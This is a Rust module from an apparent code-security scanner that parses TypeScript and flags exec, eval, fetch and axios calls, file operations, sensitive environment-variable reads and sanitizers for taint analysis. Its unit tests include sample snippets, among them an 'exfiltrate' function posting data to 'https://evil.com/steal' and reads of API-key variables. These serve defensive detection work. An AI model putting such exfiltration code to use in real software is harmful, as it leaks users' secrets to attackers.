mod ast;
mod classify;
mod patterns;

use std::collections::HashSet;
use std::path::{Path, PathBuf};

use crate::error::Result;
use crate::ir::Language;
use crate::parser::LanguageParser;
use crate::parser::ParsedFile;

#[cfg(not(feature = "typescript"))]
use crate::analysis::sensitivity::looks_sensitive_name;
#[cfg(not(feature = "typescript"))]
use crate::ir::ArgumentSource;
#[cfg(not(feature = "typescript"))]
use crate::ir::SourceLocation;
#[cfg(not(feature = "typescript"))]
use crate::ir::execution_surface::*;
#[cfg(not(feature = "typescript"))]
use crate::parser::{CallSite, FunctionDef, FunctionParam};
#[cfg(feature = "typescript")]
use ast::{collect_params, walk_node};
use classify::detect_sanitizer_assignments;
#[cfg(not(feature = "typescript"))]
use patterns::{
    CALL_RE, DYNAMIC_EXEC_PATTERNS, ENV_ACCESS_RE, EXEC_PATTERNS, FILE_PATTERNS, FUNC_DEF_RE,
    NETWORK_PATTERNS, matches_pattern,
};

pub struct TypeScriptParser;

#[cfg(feature = "typescript")]
impl LanguageParser for TypeScriptParser {
    fn language(&self) -> Language {
        Language::TypeScript
    }

    fn parse_file(&self, path: &Path, content: &str) -> Result<ParsedFile> {
        let mut parser = tree_sitter::Parser::new();
        let is_tsx = path
            .extension()
            .is_some_and(|ext| ext == "tsx" || ext == "jsx");

        let lang = if is_tsx {
            tree_sitter_typescript::LANGUAGE_TSX
        } else {
            tree_sitter_typescript::LANGUAGE_TYPESCRIPT
        };

        parser
            .set_language(&lang.into())
            .map_err(|e| crate::error::ShieldError::Parse {
                file: path.display().to_string(),
                message: format!("Failed to load TypeScript grammar: {e}"),
            })?;

        let tree = parser
            .parse(content, None)
            .ok_or_else(|| crate::error::ShieldError::Parse {
                file: path.display().to_string(),
                message: "tree-sitter failed to parse TypeScript".into(),
            })?;

        let file_path = PathBuf::from(path);
        let source = content.as_bytes();
        let mut parsed = ParsedFile::default();
        let mut param_names = HashSet::new();

        // Phase 0: Detect sanitizer assignments via regex on source text
        detect_sanitizer_assignments(content, &mut parsed.sanitized_vars);

        // Phase 1: Collect function parameters + function defs
        collect_params(
            tree.root_node(),
            source,
            &file_path,
            &mut param_names,
            &mut parsed,
        );

        // Phase 2: Walk AST for call expressions, call sites, and env accesses
        walk_node(
            tree.root_node(),
            source,
            &file_path,
            &param_names,
            &mut parsed,
        );

        Ok(parsed)
    }
}

#[cfg(not(feature = "typescript"))]
impl LanguageParser for TypeScriptParser {
    fn language(&self) -> Language {
        Language::TypeScript
    }

    fn parse_file(&self, path: &Path, content: &str) -> Result<ParsedFile> {
        let mut parsed = ParsedFile::default();
        let file_path = PathBuf::from(path);
        let mut param_names = HashSet::new();

        // Phase 0: Detect sanitizer assignments
        detect_sanitizer_assignments(content, &mut parsed.sanitized_vars);

        // Collect function parameter names + FunctionDef entries
        for cap in FUNC_DEF_RE.captures_iter(content) {
            let params_str = cap
                .get(2)
                .or_else(|| cap.get(4))
                .or_else(|| cap.get(6))
                .map(|m| m.as_str())
                .unwrap_or("");
            let func_name = cap
                .get(1)
                .or_else(|| cap.get(3))
                .or_else(|| cap.get(5))
                .map(|m| m.as_str())
                .unwrap_or("");

            let full_match = cap.get(0).map(|m| m.as_str()).unwrap_or("");
            let is_exported = full_match.starts_with("export");

            let mut func_params = Vec::new();
            for param in params_str.split(',') {
                let param = param.trim();
                if param.starts_with('{') || param.starts_with('[') {
                    continue;
                }
                let param = param.split(':').next().unwrap_or("").trim();
                let param = param.split('=').next().unwrap_or("").trim();
                let param = param.trim_start_matches("...");
                let param = param.trim_end_matches('?');
                if !param.is_empty() && param != "this" {
                    param_names.insert(param.to_string());
                    func_params.push(param.to_string());
                    parsed.function_params.push(FunctionParam {
                        function_name: func_name.to_string(),
                        param_name: param.to_string(),
                        location: regex_loc(&file_path, 0),
                    });
                }
            }

            if !func_name.is_empty() {
                parsed.function_defs.push(FunctionDef {
                    name: func_name.to_string(),
                    params: func_params,
                    is_exported,
                    location: regex_loc(&file_path, 0),
                });
            }
        }

        // Scan line by line
        for (line_idx, line) in content.lines().enumerate() {
            let line_num = line_idx + 1;
            let trimmed = line.trim();

            if trimmed.starts_with("//") || trimmed.starts_with('*') || trimmed.starts_with("/*") {
                continue;
            }

            for cap in ENV_ACCESS_RE.captures_iter(line) {
                let var_name = cap
                    .get(1)
                    .or_else(|| cap.get(2))
                    .map(|m| m.as_str().to_string())
                    .unwrap_or_default();
                let is_sensitive = looks_sensitive_name(&var_name);
                parsed.env_accesses.push(EnvAccess {
                    var_name: ArgumentSource::Literal(var_name),
                    is_sensitive,
                    location: regex_loc(&file_path, line_num),
                });
            }

            for cap in CALL_RE.captures_iter(line) {
                let func_name = &cap[1];
                let args_str = &cap[2];
                let arg_source = classify_argument_with_sanitizers(
                    args_str,
                    &param_names,
                    &parsed.sanitized_vars,
                );

                // Record CallSite
                let all_args = args_str
                    .split(',')
                    .map(|a| {
                        classify_argument_with_sanitizers(
                            a.trim(),
                            &param_names,
                            &parsed.sanitized_vars,
                        )
                    })
                    .collect::<Vec<_>>();
                parsed.call_sites.push(CallSite {
                    callee: func_name.to_string(),
                    arguments: all_args,
                    caller: None, // Regex path can't easily determine enclosing function
                    location: regex_loc(&file_path, line_num),
                });

                if matches_pattern(func_name, &EXEC_PATTERNS) {
                    parsed.commands.push(CommandInvocation {
                        function: func_name.to_string(),
                        command_arg: arg_source.clone(),
                        location: regex_loc(&file_path, line_num),
                    });
                }

                if matches_pattern(func_name, &NETWORK_PATTERNS) {
                    let sends_data = func_name.contains("post")
                        || func_name.contains("put")
                        || func_name.contains("patch")
                        || args_str.contains("body:")
                        || args_str.contains("data:");
                    let method = if func_name.contains("get") {
                        Some("GET".into())
                    } else if func_name.contains("post") {
                        Some("POST".into())
                    } else if func_name.contains("put") {
                        Some("PUT".into())
                    } else {
                        None
                    };
                    parsed.network_operations.push(NetworkOperation {
                        function: func_name.to_string(),
                        url_arg: arg_source.clone(),
                        method,
                        sends_data,
                        location: regex_loc(&file_path, line_num),
                    });
                }

                if DYNAMIC_EXEC_PATTERNS.contains(&func_name) {
                    parsed.dynamic_exec.push(DynamicExec {
                        function: func_name.to_string(),
                        code_arg: arg_source.clone(),
                        location: regex_loc(&file_path, line_num),
                    });
                }

                if matches_pattern(func_name, &FILE_PATTERNS) {
                    let op_type = if func_name.contains("write") || func_name.contains("append") {
                        FileOpType::Write
                    } else if func_name.contains("unlink") {
                        FileOpType::Delete
                    } else if func_name.contains("readdir") {
                        FileOpType::List
                    } else {
                        FileOpType::Read
                    };
                    parsed.file_operations.push(FileOperation {
                        operation: op_type,
                        path_arg: arg_source.clone(),
                        location: regex_loc(&file_path, line_num),
                    });
                }
            }
        }

        Ok(parsed)
    }
}

#[cfg(not(feature = "typescript"))]
fn regex_loc(file: &Path, line: usize) -> SourceLocation {
    SourceLocation {
        file: file.to_path_buf(),
        line,
        column: 0,
        end_line: None,
        end_column: None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::ir::ArgumentSource;

    #[test]
    fn detects_exec_with_param() {
        let code = r#"
import { exec } from "child_process";

function runCommand(command: string) {
    exec(command);
}
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("test.ts"), code)
            .unwrap();
        assert_eq!(parsed.commands.len(), 1);
        assert!(matches!(
            parsed.commands[0].command_arg,
            ArgumentSource::Parameter { .. }
        ));
    }

    #[test]
    fn detects_spawn_with_interpolation() {
        let code = r#"
function run(cmd: string) {
    exec(`${cmd} --flag`);
}
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("test.ts"), code)
            .unwrap();
        assert_eq!(parsed.commands.len(), 1);
        assert!(matches!(
            parsed.commands[0].command_arg,
            ArgumentSource::Interpolated
        ));
    }

    #[test]
    fn detects_fetch_with_param() {
        let code = r#"
async function fetchUrl(url: string) {
    const resp = await fetch(url);
    return resp.json();
}
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("test.ts"), code)
            .unwrap();
        assert_eq!(parsed.network_operations.len(), 1);
        assert!(matches!(
            parsed.network_operations[0].url_arg,
            ArgumentSource::Parameter { .. }
        ));
    }

    #[test]
    fn safe_literal_url_not_flagged() {
        let code = r#"
async function getHealth() {
    const resp = await fetch("https://api.example.com/health");
    return resp.json();
}
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("test.ts"), code)
            .unwrap();
        assert_eq!(parsed.network_operations.len(), 1);
        assert!(matches!(
            parsed.network_operations[0].url_arg,
            ArgumentSource::Literal(_)
        ));
    }

    #[test]
    fn detects_env_var_access() {
        let code = r#"
const apiKey = process.env["OPENAI_API_KEY"];
const secret = process.env.AWS_SECRET_ACCESS_KEY;
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("test.ts"), code)
            .unwrap();
        assert_eq!(parsed.env_accesses.len(), 2);
        assert!(parsed.env_accesses[0].is_sensitive);
        assert!(parsed.env_accesses[1].is_sensitive);
    }

    #[test]
    fn detects_eval() {
        let code = r#"
function execute(code: string) {
    eval(code);
}
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("test.ts"), code)
            .unwrap();
        assert_eq!(parsed.dynamic_exec.len(), 1);
        assert!(matches!(
            parsed.dynamic_exec[0].code_arg,
            ArgumentSource::Parameter { .. }
        ));
    }

    #[test]
    fn detects_file_operations() {
        let code = r#"
import fs from "fs";

function readConfig(path: string) {
    return fs.readFileSync(path, "utf-8");
}
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("test.ts"), code)
            .unwrap();
        assert_eq!(parsed.file_operations.len(), 1);
        assert!(matches!(
            parsed.file_operations[0].path_arg,
            ArgumentSource::Parameter { .. }
        ));
    }

    #[test]
    fn detects_arrow_function_params() {
        let code = r#"
const handler = async (url: string) => {
    const resp = await fetch(url);
    return resp.text();
};
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("test.ts"), code)
            .unwrap();
        assert_eq!(parsed.network_operations.len(), 1);
        assert!(matches!(
            parsed.network_operations[0].url_arg,
            ArgumentSource::Parameter { .. }
        ));
    }

    #[test]
    fn detects_axios_post() {
        let code = r#"
async function exfiltrate(data: string) {
    await axios.post("https://evil.com/steal", { body: data });
}
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("test.ts"), code)
            .unwrap();
        assert_eq!(parsed.network_operations.len(), 1);
        assert!(parsed.network_operations[0].sends_data);
    }

    // ── Tests requiring tree-sitter AST (multi-line, TSX, accurate positions) ──

    #[cfg(feature = "typescript")]
    #[test]
    fn detects_multiline_exec_call() {
        let code = r#"
function runCommand(command: string) {
    exec(
        command,
        { encoding: "utf-8" }
    );
}
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("test.ts"), code)
            .unwrap();
        assert_eq!(parsed.commands.len(), 1);
        assert!(matches!(
            parsed.commands[0].command_arg,
            ArgumentSource::Parameter { .. }
        ));
    }

    #[cfg(feature = "typescript")]
    #[test]
    fn detects_multiline_fetch() {
        let code = r#"
async function sendData(url: string) {
    const resp = await fetch(
        url,
        {
            method: "POST",
            body: JSON.stringify({ key: "value" }),
        }
    );
    return resp.json();
}
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("test.ts"), code)
            .unwrap();
        assert_eq!(parsed.network_operations.len(), 1);
        assert!(matches!(
            parsed.network_operations[0].url_arg,
            ArgumentSource::Parameter { .. }
        ));
    }

    #[cfg(feature = "typescript")]
    #[test]
    fn detects_nested_callback_exec() {
        let code = r#"
function runCommand(command: string): Promise<string> {
    return new Promise((resolve, reject) => {
        exec(command, (error, stdout) => {
            if (error) reject(error);
            resolve(stdout);
        });
    });
}
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("test.ts"), code)
            .unwrap();
        assert_eq!(parsed.commands.len(), 1);
        assert!(matches!(
            parsed.commands[0].command_arg,
            ArgumentSource::Parameter { .. }
        ));
    }

    #[cfg(feature = "typescript")]
    #[test]
    fn accurate_line_numbers() {
        let code = r#"
// line 2
// line 3
function dangerous(cmd: string) {
    exec(cmd);
}
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("test.ts"), code)
            .unwrap();
        assert_eq!(parsed.commands.len(), 1);
        // exec(cmd) is on line 5
        assert_eq!(parsed.commands[0].location.line, 5);
    }

    #[cfg(feature = "typescript")]
    #[test]
    fn handles_tsx_file() {
        let code = r#"
import React from "react";

const Component = ({ url }: { url: string }) => {
    const data = fetch(url);
    return <div>{data}</div>;
};
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("component.tsx"), code)
            .unwrap();
        assert_eq!(parsed.network_operations.len(), 1);
        assert!(matches!(
            parsed.network_operations[0].url_arg,
            ArgumentSource::Parameter { .. }
        ));
    }

    // ── Cross-file support tests ──

    #[test]
    fn extracts_function_defs() {
        let code = r#"
export async function readFileContent(filePath: string) {
    return fs.readFile(filePath, "utf-8");
}

function internalHelper(x: number) {
    return x + 1;
}
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("lib.ts"), code)
            .unwrap();
        assert!(parsed.function_defs.len() >= 2);
        let exported = parsed
            .function_defs
            .iter()
            .find(|d| d.name == "readFileContent");
        assert!(exported.is_some());
        assert!(exported.unwrap().is_exported);
        assert_eq!(exported.unwrap().params, vec!["filePath"]);

        let internal = parsed
            .function_defs
            .iter()
            .find(|d| d.name == "internalHelper");
        assert!(internal.is_some());
        assert!(!internal.unwrap().is_exported);
    }

    #[test]
    fn extracts_call_sites() {
        let code = r#"
async function handler(args: any) {
    const validPath = await validatePath(args.path);
    const content = await readFileContent(validPath);
    return content;
}
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("index.ts"), code)
            .unwrap();
        assert!(!parsed.call_sites.is_empty());
        let rfc_call = parsed
            .call_sites
            .iter()
            .find(|cs| cs.callee == "readFileContent");
        assert!(rfc_call.is_some(), "Should find readFileContent call site");
    }

    #[test]
    fn detects_sanitizer_assignment() {
        let code = r#"
async function handler(args: any) {
    const validPath = await validatePath(args.path);
    const content = await readFileContent(validPath);
    return content;
}
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("index.ts"), code)
            .unwrap();
        assert!(parsed.sanitized_vars.contains("validPath"));

        // The call to readFileContent(validPath) should classify validPath as Sanitized
        let rfc_call = parsed
            .call_sites
            .iter()
            .find(|cs| cs.callee == "readFileContent");
        assert!(rfc_call.is_some());
        let rfc = rfc_call.unwrap();
        assert!(!rfc.arguments.is_empty());
        assert!(
            matches!(&rfc.arguments[0], ArgumentSource::Sanitized { .. }),
            "validPath should be classified as Sanitized, got: {:?}",
            rfc.arguments[0]
        );
    }

    #[test]
    fn sanitized_var_from_path_resolve() {
        let code = r#"
function processFile(rawPath: string) {
    const safePath = path.resolve(rawPath);
    fs.readFileSync(safePath, "utf-8");
}
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("test.ts"), code)
            .unwrap();
        assert!(parsed.sanitized_vars.contains("safePath"));
    }

    #[test]
    fn url_parse_assignment_is_not_sanitized_for_ssrf() {
        let code = r#"
async function handler(args: { url: string }) {
    const parsedUrl = URL.parse(args.url);
    return fetch(parsedUrl);
}
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("test.ts"), code)
            .unwrap();

        assert!(!parsed.sanitized_vars.contains("parsedUrl"));
        assert_eq!(parsed.network_operations.len(), 1);
        assert!(
            parsed.network_operations[0].url_arg.is_tainted(),
            "URL.parse output must remain tainted for network sinks"
        );
    }

    #[test]
    fn redaction_assignment_is_not_sanitized_for_file_paths() {
        let code = r#"
function redactSecret(value: string): string {
    return value.replace(/secret/g, "[REDACTED]");
}

function handler(args: { path: string }) {
    const redactedPath = redactSecret(args.path);
    return fs.readFileSync(redactedPath, "utf-8");
}
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("test.ts"), code)
            .unwrap();

        assert!(!parsed.sanitized_vars.contains("redactedPath"));
        assert_eq!(parsed.file_operations.len(), 1);
        assert!(
            parsed.file_operations[0].path_arg.is_tainted(),
            "redaction output must remain tainted for file path sinks"
        );
    }
}
